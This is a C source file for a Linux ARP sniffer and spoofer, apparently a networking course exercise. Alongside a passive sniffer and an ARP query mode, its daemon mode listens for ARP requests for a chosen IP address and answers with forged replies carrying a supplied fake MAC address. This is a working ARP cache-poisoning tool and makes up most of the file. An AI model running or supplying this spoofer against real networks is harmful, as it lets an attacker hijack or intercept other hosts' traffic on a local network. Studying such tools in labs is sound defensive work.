#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEVICE_NAME "ens33"
#define BROADCAST_MAC "\xff\xff\xff\xff\xff\xff"
#define BUFFER_SIZE 65536

void show() {
    printf("[ ARP sniffer and spoof program ]\n");
    printf("Format :\n");
    printf("1) ./arp -l -a\n");
    printf("2) ./arp -l <filter_ip_address>\n");
    printf("3) ./arp -q <query_ip_address>\n");
    printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
}

void get_local_ip(const char* interface, char* the_buffer) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;   //set address as AF_INET(IPv4)
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {    //SIOCGIFADDR return AF_INET address, store result in ifr
        perror("ioctl() failed to get local IP address");
        close(fd);
        exit(1);
    }

    strcpy(the_buffer, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    close(fd);
}

void send_arp_request(int the_socket, const char* interface, const char* target_ip) {
    struct sockaddr_ll socket_address;
    struct ether_arp arp_req;
    struct ether_header ether_h;
    struct ifreq ifr;

    char local_ip[INET_ADDRSTRLEN];
    get_local_ip(interface, local_ip);
    //get interface's MAC address
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(the_socket, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl() failed to get source MAC address ");
        exit(1);
    }
    //set ethernet packet
    memcpy(ether_h.ether_dhost, BROADCAST_MAC, 6);
    memcpy(ether_h.ether_shost, ifr.ifr_hwaddr.sa_data, 6);
    ether_h.ether_type = htons(ETH_P_ARP);
    //set ARP request
    arp_req.arp_hrd = htons(ARPHRD_ETHER);
    arp_req.arp_pro = htons(ETH_P_IP);
    arp_req.arp_hln = 6;
    arp_req.arp_pln = 4;
    arp_req.arp_op = htons(ARPOP_REQUEST);

    memcpy(arp_req.arp_sha, ifr.ifr_hwaddr.sa_data, 6);  //arp_sha Source Hardware Address, store sender MAC address
    inet_pton(AF_INET, local_ip, arp_req.arp_spa); // Dec address convert to Bin address; arp_spa Source Protocol Address, store sender IP address

    memset(arp_req.arp_tha, 0x00, 6);   //Target Hardware Address
    inet_pton(AF_INET, target_ip, arp_req.arp_tpa);
    //set socket address
    socket_address.sll_ifindex = if_nametoindex(interface);
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, BROADCAST_MAC, 6);
    // build packet and send
    unsigned char buffer[42];
    memcpy(buffer, &ether_h, sizeof(struct ether_header));
    memcpy(buffer + sizeof(struct ether_header), &arp_req, sizeof(struct ether_arp));
    if (sendto(the_socket, buffer, 42, 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto failed");
        exit(1);
    }
    printf("[ ARP sniffer and spoof program ]\n");
    printf("### ARP query mode ###\n");
  
}

void send_arp_reply(int the_socket, const char* interface, const char* target_ip, const unsigned char* fake_mac, const unsigned char* request_mac) {
    struct sockaddr_ll socket_address;
    struct ether_header ether_h;
    struct ether_arp arp_resp;
    struct ifreq ifr;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(the_socket, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl() failed to get source MAC address ");
        exit(1);
    }

    memcpy(ether_h.ether_dhost, request_mac, 6);
    memcpy(ether_h.ether_shost, fake_mac, 6);
    ether_h.ether_type = htons(ETH_P_ARP);

    arp_resp.arp_hrd = htons(ARPHRD_ETHER);
    arp_resp.arp_pro = htons(ETH_P_IP);
    arp_resp.arp_hln = 6;
    arp_resp.arp_pln = 4;
    arp_resp.arp_op = htons(ARPOP_REPLY);

    memcpy(arp_resp.arp_sha, fake_mac, 6);   //let fake MAC as sender address
    inet_pton(AF_INET, target_ip, arp_resp.arp_spa);
    memcpy(arp_resp.arp_tha, request_mac, 6);   //let requester MAC as target address
    inet_pton(AF_INET, target_ip, arp_resp.arp_tpa);

    socket_address.sll_ifindex = if_nametoindex(interface);
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, request_mac, 6);

    unsigned char buffer[42];
    memcpy(buffer, &ether_h, sizeof(struct ether_header));
    memcpy(buffer + sizeof(struct ether_header), &arp_resp, sizeof(struct ether_arp));
    if (sendto(the_socket, buffer, 42, 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto failed");
        exit(1);
    }

    printf("Sent ARP Reply: %s is %02x:%02x:%02x:%02x:%02x:%02x\n",
        target_ip, fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3], fake_mac[4], fake_mac[5]);
    printf("Send successful.\n");
}

void receive_arp_reply(int the_socket, const char* target_ip) {
    unsigned char buffer[BUFFER_SIZE];
    while (1) {
        int data_size = recvfrom(the_socket, buffer, BUFFER_SIZE, 0, NULL, NULL);
        if (data_size < 0) {
            perror("recvfrom failed");
            exit(1);
        }

        struct ether_header* ether_h = (struct ether_header*)buffer;
        if (ntohs(ether_h->ether_type) == ETH_P_ARP) {   //check ethernet head is arp or not
            struct ether_arp* arp_resp = (struct ether_arp*)(buffer + sizeof(struct ether_header));

            char sender_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp_resp->arp_spa, sender_ip, INET_ADDRSTRLEN);
            if (strcmp(sender_ip, target_ip) == 0 && ntohs(arp_resp->arp_op) == ARPOP_REPLY) {
                printf("MAC address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n", target_ip,
                    arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
                    arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
                break;
            }
        }
    }
}

void handle_arp_packet_with_reply(unsigned char* buffer, const char* filter_ip, const unsigned char* fake_mac, int the_socket) {
    struct ether_header* ether_h = (struct ether_header*)buffer;

    if (ntohs(ether_h->ether_type) == ETH_P_ARP) {
        struct ether_arp* arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));

        struct in_addr sender, target;
        memcpy(&sender, arp->arp_spa, sizeof(sender));
        memcpy(&target, arp->arp_tpa, sizeof(target));

        char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sender, sender_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &target, target_ip, INET_ADDRSTRLEN);

        if (strcmp(target_ip, filter_ip) == 0 && ntohs(arp->arp_op) == ARPOP_REQUEST) {
            //printf("Get ARP packet - Who has %s? Tell %s\n", target_ip, sender_ip);
            send_arp_reply(the_socket, DEVICE_NAME, filter_ip, fake_mac, ether_h->ether_shost);
        }
    }
}

void handle_arp_packet(unsigned char* buffer, const char* filter_ip) {
    struct ether_header* ether_h = (struct ether_header*)buffer;

    if (ntohs(ether_h->ether_type) == ETH_P_ARP) {
        struct ether_arp* arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));  //analyze ARP packet

        struct in_addr sender, target;
        memcpy(&sender, arp->arp_spa, sizeof(sender));
        memcpy(&target, arp->arp_tpa, sizeof(target));

        char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sender, sender_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &target, target_ip, INET_ADDRSTRLEN);

       if (filter_ip == NULL || strcmp(target_ip, filter_ip) == 0) {
            printf("Get ARP packet - Who has %s? Tell %s\n", target_ip, sender_ip);
        }  
    }
}

int main(int argc, char* argv[]) {
    int sockfd_recv = 0;
    struct sockaddr_ll sa;
    unsigned char* buffer = (unsigned char*)malloc(BUFFER_SIZE);
    socklen_t sa_len = sizeof(sa);

    if (argc < 2 || argc > 4) {
        show();
        exit(1);
    }

    if (strcmp(argv[1], "-help") == 0) {
        show();
        exit(0);
    }

    if (strcmp(argv[1], "-l") == 0) {
        const char* filter_ip = NULL;

        if (argc == 3 && strcmp(argv[2], "-a") == 0) {
            filter_ip = NULL;
        }
        else if (argc == 3) {
            filter_ip = argv[2];
        }
        else {
            show();
            exit(1);
        }

        if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
            perror("open recv socket error");
            exit(1);
        }
        printf("[ ARP sniffer and spoof program ]\n");
        printf("### ARP sniffer mode ###\n");
        while (1) {
            int data_size = recvfrom(sockfd_recv, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&sa, &sa_len);
            if (data_size < 0) {
                perror("recvfrom error");
                exit(1);
            }
            handle_arp_packet(buffer, filter_ip);
        }
    }

    if (strcmp(argv[1], "-q") == 0 && argc == 3) {
        const char* target_ip = argv[2];

        int the_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (the_socket < 0) {
            perror("socket creation failed");
            return 1;
        }

        send_arp_request(the_socket, DEVICE_NAME, target_ip);
        receive_arp_reply(the_socket, target_ip);

        close(the_socket);
        return 0;
    }

    if (argc == 3) {
        unsigned char fake_mac[6];
        if (sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &fake_mac[0], &fake_mac[1], &fake_mac[2],
            &fake_mac[3], &fake_mac[4], &fake_mac[5]) != 6) {
            fprintf(stderr, "Invalid MAC address format\n");
            return 1;
        }

        const char* target_ip = argv[2];
        int the_socket_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));  //create raw socket to capture all packets transmitted on network
        if (the_socket_recv < 0) {
            perror("open recv socket error");
            exit(1);
        }

        printf("### ARP daemon mode ###\n");
        while (1) {
            int data_size = recvfrom(the_socket_recv, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&sa, &sa_len);  //capture packet from internet, store it into buffer
            if (data_size < 0) {
                perror("recvfrom error");
                exit(1);
            }
            handle_arp_packet_with_reply(buffer, target_ip, fake_mac, the_socket_recv);
        }
    }

    free(buffer);
    return 0;
}
